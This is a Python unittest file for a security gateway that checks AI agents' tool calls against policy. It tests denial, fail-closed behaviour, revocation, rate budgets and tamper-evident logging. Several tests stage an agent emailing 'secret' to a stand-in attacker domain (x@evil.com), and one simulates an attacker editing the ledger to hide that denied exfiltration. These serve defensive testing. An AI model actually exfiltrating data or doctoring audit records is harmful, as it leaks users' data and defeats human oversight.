"""Run: python -m unittest -v   (needs the `opa` binary on PATH or OPA_BIN set)"""
import json
import tempfile
import threading
import unittest
from pathlib import Path
from unittest import mock

from attacks.harness import OPA, make_gateway
from gateway import mcp_server
from gateway.policy import PolicyClient


class GatewayTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.opa = OPA().__enter__()

    @classmethod
    def tearDownClass(cls):
        cls.opa.__exit__(None, None, None)

    def setUp(self):
        self.dir = tempfile.mkdtemp()
        self.gw = make_gateway(self.opa.url, self.dir)
        self.tok, self.claims = self.gw.broker.issue(
            "alice@corp.com", "agent:t", "summarize_and_email", {"email_domains": ["corp.com"], "max_emails": 5})

    def test_allowed_call_executes_and_is_logged(self):
        r = self.gw.call(self.tok, "email.send", {"to": "team@corp.com", "body": "hi"})
        self.assertTrue(r.allowed)
        self.assertEqual(r.result["sent"], 1)
        rec = list(self.gw.ledger.records(self.claims["task"]))[-1]
        self.assertEqual((rec["decision"], rec["sub"], rec["act"]), ("ALLOW", "alice@corp.com", "agent:t"))

    def test_denied_call_never_executes(self):
        outbox = Path(self.dir) / "outbox.jsonl"
        r = self.gw.call(self.tok, "email.send", {"to": "x@evil.com", "body": "secret"})
        self.assertFalse(r.allowed)
        self.assertIsNone(r.result)
        self.assertFalse(outbox.exists() and "evil.com" in outbox.read_text())

    def test_fail_closed_when_policy_engine_down(self):
        self.gw.policy = PolicyClient("http://127.0.0.1:1", None, timeout=0.2)
        r = self.gw.call(self.tok, "email.send", {"to": "team@corp.com", "body": "hi"})
        self.assertFalse(r.allowed)
        self.assertIn("policy engine unavailable", r.reasons[0])

    def test_revocation_is_immediate(self):
        self.assertTrue(self.gw.call(self.tok, "fs.list", {"path": "."}).allowed)
        self.gw.broker.revoke(self.claims["task"])
        self.assertEqual(self.gw.call(self.tok, "fs.list", {"path": "."}).reasons, ["task revoked"])

    def test_budget_holds_under_concurrency(self):
        results = []
        ts = [threading.Thread(target=lambda: results.append(
            self.gw.call(self.tok, "email.send", {"to": "a@corp.com", "body": "x"}).allowed)) for _ in range(20)]
        [t.start() for t in ts]
        [t.join() for t in ts]
        self.assertEqual(sum(results), 5)

    def test_ledger_detects_edit(self):
        self.gw.call(self.tok, "email.send", {"to": "x@evil.com", "body": "a"})
        self.gw.call(self.tok, "fs.list", {"path": "."})
        self.assertTrue(self.gw.ledger.verify()[0])
        p = self.gw.ledger.path
        lines = p.read_text().splitlines()
        r = json.loads(lines[0])
        r["decision"] = "ALLOW"  # attacker hides the denied exfil attempt
        lines[0] = json.dumps(r, sort_keys=True)
        p.write_text("\n".join(lines) + "\n")
        ok, msg = self.gw.ledger.verify()
        self.assertFalse(ok)
        self.assertIn("seq 1", msg)

    def test_ledger_detects_deleted_record(self):
        for _ in range(3):
            self.gw.call(self.tok, "fs.list", {"path": "."})
        p = self.gw.ledger.path
        lines = p.read_text().splitlines()
        p.write_text("\n".join(lines[:1] + lines[2:]) + "\n")
        self.assertFalse(self.gw.ledger.verify()[0])

    def test_args_hash_records_raw_input(self):
        self.gw.call(self.tok, "email.send", {"to": "a@corp.com", "body": 7})
        from gateway.ledger import args_hash
        rec = list(self.gw.ledger.records())[-1]
        self.assertEqual(rec["args_hash"], args_hash({"to": "a@corp.com", "body": 7}))

    def test_mcp_denial_surfaces_as_tool_error(self):
        denied = {"allowed": False, "reasons": ["recipient domain evil.com not in grant"]}
        with mock.patch.object(mcp_server, "forward", return_value=denied):
            out = mcp_server.handle({"jsonrpc": "2.0", "id": 1, "method": "tools/call",
                                     "params": {"name": "email_send", "arguments": {"to": "x@evil.com"}}})
        self.assertTrue(out["isError"])
        self.assertIn("evil.com", out["content"][0]["text"])

    def test_mcp_lists_all_tools(self):
        names = {t["name"] for t in mcp_server.handle({"id": 1, "method": "tools/list"})["tools"]}
        self.assertEqual(names, {"fs_read", "fs_list", "fs_write", "email_send", "http_request"})


if __name__ == "__main__":
    unittest.main()
